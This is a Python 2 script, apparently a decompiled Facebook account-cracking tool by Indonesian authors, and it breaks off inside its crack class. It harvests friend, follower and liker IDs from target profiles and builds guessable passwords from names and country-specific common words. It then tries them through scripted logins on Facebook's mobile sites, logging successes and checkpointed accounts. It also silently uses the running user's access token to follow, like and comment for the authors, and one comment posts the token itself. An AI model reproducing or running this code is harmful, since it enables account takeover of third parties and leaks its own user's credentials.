#-*-coding:utf-8-*-
#DECOMPILE BY: SakuraDevOps
import requests,bs4,sys,os,subprocess,time,datetime
import requests,sys,random,re,base64,json
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from urllib2 import urlopen
reload(sys)
sys.setdefaultencoding("utf-8")

def jalan(z):
	for i in z + '\n':
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(00.1)

logo = ("""\x1b[1;92m    __  ____ ______ __☆☆☆☆☆☆☆☆☆☆☆___ ______ ® 
\x1b[1;92m   /  \/   /__    )   )___ _____/  /__    ) 
\x1b[1;92m  /       /___)   /  __  )  ___   /___)   / 
\x1b[1;96m /  /\/  /  __   /  / /  / (__/  /  __   / 
\x1b[1;96m/__/ /__/(______/__/ /__/(______/(______/ V2.0.1
\x1b[1;95m=================================================
\x1b[1;92m╔══◍➤\x1b[1;97mAutor     : \x1b[1;92mAngga
\x1b[1;92m╠══◍➤\x1b[1;97mGithub    : \x1b[1;92mhttps://github.com/Bajingan-Z
\x1b[1;92m╠══◍➤\x1b[1;97mFacebook  : \x1b[1;92mfb.me/PEMUDA.KALEUM
\x1b[1;92m║
\x1b[1;92m╚══◍➤\x1b[1;97mCoded By  : \x1b[1;92mRaka \x1b[1;97m& \x1b[1;92mAngga
\x1b[1;95m=================================================""")
url=('http://ipinfo.io/json')
response=urlopen(url)
data=json.load(response)
ip=data['ip']
org=data['org']
country=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"]
ua=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mobile_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
raka_sayang_amanda = '4257706904267068'
def login():
	os.system('clear')
	print(logo)
	print("\x1b[1;92m╔══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Using Facebook Token")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m How to Get Facebook Token")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;97m Go Out")
	print("\x1b[1;92m║")
        login = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
	if login == "":
		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;91mWrong Input")
	elif login == "1":
                try:
			token=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Token  :\x1b[1;92m ")
                        jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Please Wait ..."); time.sleep(00.01)
                        jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Proses Login Mohon Tunggu Sebentar ..."); time.sleep(00.01)
                        cek=requests.get('https://graph.facebook.com/me?access_token='+token)
                        y=json.loads(cek.text)
                        nama = y['name']
                        save = open("___bangsat___", 'w')
                        save.write(token)
                        save.close()
                        bot_follow_sayang()
                except KeyError:
                        exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Expired")
	elif login == "2":
		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m You Will Be Redirected To Youtube")
		time.sleep(2)
		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
		exit()
	elif login == "0":
		exit()
	else:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
def bot_follow_sayang():
	try:
		token=open('___bangsat___','r').read()
	except IOError:
                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
		os.system('rm -rf ___bangsat___')
		time.sleep(2)
		login()
	web = datetime.datetime.now()
        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah.","Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
	kata_utama = ("Pengguna Script (ＭＡＮＤＡ) ")
	komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
	kata_utama2 = random.choice(["Hai Aa Ｒａｋａ 😊","Hello Aa Ｒａｋａ 😊","Hello Aa Ｒａｋａ 😊","Hai Aa Ｒａｋａ 😊"])
	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
	kata_utama3 = ("Sukses Selalu Aa Ｒａｋａ 😊")
	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
	requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
	requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen2+'&access_token='+token)
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
	print("\x1b[1;92m║")
	print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Login Success...")
	menu()
def publik():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Profil ID :\x1b[1;92m ")
                file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
                try:
                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                        op = json.loads(req.text)
                        print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name :\x1b[1;92m "+op["name"])
                except KeyError:
                        print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Profile Not Found')
	                print("\x1b[1;92m║")
                        raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                        menu()
                r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
                id = []
                z=json.loads(r.text)
                fle = open(file , 'a')#.replace(" ","_")
                for a in z['friends']['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Target Id\x1b[1;92m %s\x1b[1;97m "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
                print("\r\x1b[1;92m                     ")
                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Dump Tersimpan :\x1b[1;92m "+file)
	        print("\x1b[1;92m║")
                raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                menu()

        except KeyError:
                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Teman')
	        print("\x1b[1;92m║")
                raw_input('\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]')
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
def like_post():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
		print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Post ID :\x1b[1;92m ")
                file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama File :\x1b[1;92m ")
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                except KeyError:
			print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Post ID Tidak Ada')
			raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                        menu()
                id = []
                z=json.loads(r.text)
                fle = open(file , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Target Id\x1b[1;92m %s \x1b[1;97m \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
		print("\r\x1b[1;97m                   ")
		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Dump Tersimpan :\x1b[1;92m "+file)
	        print("\x1b[1;92m║")
		raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
		menu()

	except requests.exceptions.ConnectionError:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
def follower():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Profil ID :\x1b[1;92m ")
                file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
                try:
                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                        op = json.loads(req.text)
                        print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name : \x1b[1;92m"+op["name"])
                except KeyError:
                        print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Profile Not Found')
	                print("\x1b[1;92m║")
                        raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                        menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=9999999")
                id = []
                z=json.loads(r.text)
                fle = open(file , 'a')#.replace(" ","_")
                for a in z['friends']['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Target Id\x1b[1;92m %s \x1b[1;97m "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
                print("\r\x1b[1;97m                     ")
                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Dump Tersimpan :\x1b[1;92m "+file)
	        print("\x1b[1;92m║")
                raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                menu()

        except KeyError:
                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Follower')
	        print("\x1b[1;92m║")
                raw_input('\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]')
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
def teman():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
		file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                except KeyError:
                        print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Teman')
	                print("\x1b[1;92m║")
                        raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                        menu()
                id = []
                z=json.loads(r.text)
                fle = open(file , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Target Id\x1b[1;92m %s\x1b[1;97m \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
		print("\r\x1b[1;97m                   ")
                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Tersimpan :\x1b[1;92m "+file)
	        print("\x1b[1;92m║")
                raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mReturn\x1b[1;92m]")
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
def menu():
	global ip, org
	try:
		token=open('___bangsat___','r').read()
	except IOError:
		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid")
		os.system('rm -rf ___bangsat___')
		time.sleep(2)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid")
		os.system('rm -rf ___bangsat___')
		time.sleep(2)
		login()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;92m╚══◍➤[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
	os.system("clear")
	print(logo)
	print("\x1b[1;92m╔══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name : "+nama)
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Ip   : "+ip)
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Stts : \x1b[1;92mPremium")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Org  : "+org)
	print("\x1b[1;92m║")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Target Public Id")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Target Id Likes Posts")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Target Follower Id")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m4\x1b[1;92m]\x1b[1;97m Friend's Target Id")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m5\x1b[1;92m]\x1b[1;92m STAR CRACK")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m6\x1b[1;92m]\x1b[1;97m View Crack Results")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m7\x1b[1;92m]\x1b[1;91m Report A Bug")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;91m Remove Token")
	print("\x1b[1;92m║")
	daftar_menu()
def daftar_menu():
	pilih = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
	if pilih == "":
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;91m•\x1b[1;92m]\x1b[1;97m Wrong Input")
	elif pilih == "1":
		publik()
	elif pilih == "2":
		like_post()
	elif pilih == "3":
		follower()
	elif pilih == "4":
		teman()
	elif pilih == "5":
		metode()
	elif pilih == "6":
		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Lihat Hasil\x1b[1;92m OK")
		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Lihat Hasil\x1b[1;93m CP")
		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;97m Return")
	        print("\x1b[1;92m║")
		lihat = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
		if lihat == "":
			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
		elif lihat == "1":
			try:
				live=open('Live.txt','r').read()
			except IOError:
				exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Hasil OK Tidak Ada")
			print("\x1b[1;92m"+live)
			exit()
		elif lihat == "2":
			try:
                                chek=open('Check.txt','r').read()
                        except IOError:
                                exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Hasil CP Tidak Ada")
                        print("\x1b[1;93m"+chek)
			exit()
		elif lihat == "0":
			menu()
		else:
			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
	elif pilih == "7":
		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Messenger")
		time.sleep(2)
		os.system("xdg-open https://m.me/PEMUDA.KALEUM?text=Hallo%20Bang%20Ganteng")
		exit()
	elif pilih == "0":
		try:
			Jalan("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Deleting Token Successful see you 😊");time.sleep(0.001)
			os.remove("___bangsat___")
		except Exception as e:
			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
	else:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
def metode():
	print("\x1b[1;92m║")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Metode Mbasic")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Metode Free Facebook")
	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Metode Mobile Facebook")
	print("\x1b[1;92m║")
	metode=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
	if metode == '':
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
	elif metode == '1':
		crack()
	elif metode == '2':
		crack2()
	elif metode == '3':
		crack3()
	else:
		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
def generate(text):
	global country
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
				results.append(text)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(text)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				if "Indonesia" in country:
					results.append("bismillah")
                                        results.append("sayang")
                                        results.append("anjing")
                                        results.append("indonesia")
				if "Pakistan" in country:
					results.append("pakistan")
					results.append("786786")
				if "Bangladesh" in country:
					results.append("bangladesh")
					results.append("102030")
	return results
def mobile(em,pas,hosts):
    global ua,mobile_h
    r = requests.Session()
    r.headers.update(mobile_h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
